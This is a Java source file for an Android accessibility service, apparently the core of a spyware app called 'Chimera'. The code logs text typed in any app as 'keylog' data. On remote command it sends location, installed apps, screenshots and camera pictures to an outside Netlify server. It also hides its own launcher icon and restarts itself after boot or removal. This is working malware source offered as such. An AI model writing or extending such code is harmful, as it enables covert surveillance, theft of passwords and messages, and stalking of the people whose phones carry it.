package com.chimera;

import android.Manifest;
import android.accessibilityservice.AccessibilityService;
import android.annotation.SuppressLint;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.SystemClock;
import android.provider.Settings;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import androidx.core.content.ContextCompat;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.List;

public class CoreService extends AccessibilityService {
    // ... (Variables and onCreate are the same)
    private static final String TAG = "CoreService";
    private static final String SUBMIT_DATA_URL = "https://chimeradmin.netlify.app/.netlify/functions/submit-data";

    private RequestQueue requestQueue;
    private FusedLocationProviderClient fusedLocationClient;
    private String lastForegroundAppPkg = "N/A";
    private final Handler keylogHandler = new Handler(Looper.getMainLooper());
    private final StringBuilder keylogBuffer = new StringBuilder();
    private String keylogSourceApp = "";
    private static final long KEYLOG_FLUSH_DELAY_MS = 3000;

    private final Runnable flushKeylogRunnable = () -> {
        if (keylogBuffer.length() > 0) {
            submitDataToServer("keylog", "App: " + keylogSourceApp + " | Text: " + keylogBuffer.toString());
            keylogBuffer.setLength(0);
        }
    };
    public static class BootReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (intent != null && Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
                try {
                    Intent serviceIntent = new Intent(context, CoreService.class);
                    context.startService(serviceIntent);
                } catch (Exception e) {
                    Log.e("BootReceiver", "Failed to start CoreService", e);
                }
            }
        }
    }
    @Override
    public void onCreate() {
        super.onCreate();
        this.requestQueue = Volley.newRequestQueue(getApplicationContext());
        this.fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
        Log.i(TAG, "CoreService instance created and initialized.");
    }
    
    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        submitDataToServer("lifecycle", "Accessibility Service bound and connected.");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && intent.getAction() != null) {
            handleCommand(intent);
        }
        return START_STICKY;
    }

    private void handleCommand(Intent intent) {
        String action = intent.getAction();
        if (action == null) return;
        String command = action.replace("com.chimera.action.", "").toUpperCase();
        submitDataToServer("lifecycle", "Command received: " + command);

        switch (command) {
            case "TOGGLE_ICON":
                boolean show = Boolean.parseBoolean(intent.getStringExtra("show"));
                handleToggleIcon(show);
                break;
            case "GET_LOCATION":
                handleGetLocation();
                break;
            case "LIST_APPS":
                handleListApps();
                break;
            case "SCREENSHOT":
                // THIS IS THE CORRECT, ROBUST WAY
                Intent screenshotIntent = new Intent(this, ScreenshotService.class);
                ContextCompat.startForegroundService(this, screenshotIntent);
                break;
            case "PICTURE":
                handleTakePicture(intent.getStringExtra("camera_id"));
                break;
        }
    }

    // ... (All other methods like onAccessibilityEvent, handleToggleIcon, etc., are exactly the same as the last correct version. No changes needed there.)
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED && event.getPackageName() != null) {
            keylogHandler.removeCallbacks(flushKeylogRunnable);
            flushKeylogRunnable.run();
            lastForegroundAppPkg = event.getPackageName().toString();
        } else if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED && event.getText() != null) {
            String currentText = event.getText().toString();
            if (currentText.isEmpty()) return;
            if (!lastForegroundAppPkg.equals(keylogSourceApp) && keylogBuffer.length() > 0) {
                keylogHandler.removeCallbacks(flushKeylogRunnable);
                flushKeylogRunnable.run();
            }
            keylogSourceApp = lastForegroundAppPkg;
            keylogBuffer.setLength(0);
            keylogBuffer.append(currentText);
            keylogHandler.removeCallbacks(flushKeylogRunnable);
            keylogHandler.postDelayed(flushKeylogRunnable, KEYLOG_FLUSH_DELAY_MS);
        }
    }

    private void handleToggleIcon(boolean show) {
        PackageManager pm = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        int state = show ? PackageManager.COMPONENT_ENABLED_STATE_ENABLED : PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
        pm.setComponentEnabledSetting(componentName, state, PackageManager.DONT_KILL_APP);
        submitDataToServer("lifecycle", "Icon visibility set to: " + show);
    }

    @SuppressLint("MissingPermission")
    private void handleGetLocation() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            submitDataToServer("location_error", "Permission denied");
            return;
        }
        fusedLocationClient.getLastLocation().addOnSuccessListener(location -> {
            if (location != null) {
                try {
                    JSONObject locJson = new JSONObject();
                    locJson.put("latitude", location.getLatitude());
                    locJson.put("longitude", location.getLongitude());
                    locJson.put("accuracy", location.getAccuracy());
                    submitDataToServer("location", locJson);
                } catch (JSONException e) { submitDataToServer("location_error", "JSON creation failed."); }
            } else { submitDataToServer("location_error", "Location not available."); }
        });
    }

    private void handleListApps() {
        PackageManager pm = getPackageManager();
        List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
        JSONObject apps = new JSONObject();
        for (ApplicationInfo packageInfo : packages) {
            if ((packageInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                try {
                    apps.put(packageInfo.packageName, pm.getApplicationLabel(packageInfo).toString());
                } catch (JSONException e) { Log.e(TAG, "JSON error listing apps"); }
            }
        }
        submitDataToServer("installed_apps", apps);
    }

    private void handleTakePicture(String cameraIdStr) {
        int cameraId = 0;
        try { if (cameraIdStr != null) cameraId = Integer.parseInt(cameraIdStr); } catch (NumberFormatException e) { /* ignore */ }
        Intent intent = new Intent(this, CameraActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.putExtra("camera_id", cameraId);
        startActivity(intent);
    }

    private void submitDataToServer(String dataType, Object payload) {
        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        JSONObject postData = new JSONObject();
        try {
            postData.put("deviceId", deviceId);
            postData.put("dataType", dataType);
            postData.put("payload", payload);
            JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, SUBMIT_DATA_URL, postData,
                r -> Log.i(TAG, "Data submitted: " + dataType), e -> Log.e(TAG, "Submit failed: " + e.toString()));
            requestQueue.add(request);
        } catch (JSONException e) { Log.e(TAG, "JSON creation failed", e); }
    }

    @Override
    public void onInterrupt() {
        submitDataToServer("lifecycle", "Service interrupted.");
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        submitDataToServer("lifecycle", "Task removed. Scheduling restart.");
        super.onTaskRemoved(rootIntent);
        Intent restart = new Intent(getApplicationContext(), this.getClass()).setPackage(getPackageName());
        PendingIntent pi = PendingIntent.getService(this, 1, restart, PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE);
        ((AlarmManager) getSystemService(Context.ALARM_SERVICE)).set(AlarmManager.ELAPSED_REALTIME, SystemClock.elapsedRealtime() + 1000, pi);
    }
}
